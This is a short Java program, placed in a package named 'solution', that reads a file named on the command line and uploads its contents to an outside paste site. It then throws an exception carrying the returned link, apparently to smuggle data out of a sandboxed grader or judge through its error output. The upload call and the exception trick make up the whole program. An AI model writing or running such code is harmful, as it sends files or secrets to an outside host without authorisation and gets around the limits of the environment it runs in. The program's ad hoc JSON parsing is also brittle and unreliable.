package app.solution;

import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

public class Fetcher {
    public static void main(String[] args) throws Exception {
        String input = readInput(args[0]);
        String response = post(input);
        Map<String, String> data = parseJSON(response);

        var link = data.get("rich_link").replace("\\", "");
        throw new Exception("https://"+link);
    }

    private static String readInput(String path) throws Exception {
        var data = Files.readAllBytes(Paths.get(path));
        return new String(data, Charset.defaultCharset());
    }

    private static String post(String data) throws Exception {
        // Define the server endpoint to send the HTTP request to
        URL serverUrl = new URL("http://pastebin.xyz/api/v1/paste.php");
        HttpURLConnection urlConnection = (HttpURLConnection) serverUrl.openConnection();

        // Indicate that we want to write to the HTTP request body
        urlConnection.setDoOutput(true);
        urlConnection.setRequestMethod("POST");

        // Writing the post data to the HTTP request body
        BufferedWriter httpRequestBodyWriter = new BufferedWriter(
                new OutputStreamWriter(urlConnection.getOutputStream()));
        httpRequestBodyWriter.write("code="+data);
        httpRequestBodyWriter.close();

        // Reading from the HTTP response body
        var sb = new StringBuilder();
        Scanner httpResponseScanner = new Scanner(urlConnection.getInputStream());
        while (httpResponseScanner.hasNextLine()) {
            sb.append(httpResponseScanner.nextLine());
            sb.append('\n');
        }
        httpResponseScanner.close();
        return sb.toString();
    }

    private static Map<String, String> parseJSON(String json) {
        var data = new HashMap<String, String>();
        var props = json
            .replace("{", "").replace("}", "")
            .split(",");

        for (var prop : props) {
            var parts = prop.split(":");
            var key = parts[0].replaceAll("\"", "");
            var val = parts[1].replaceAll("\"", "");

            data.put(key, val);
        }
        return data;
    }
}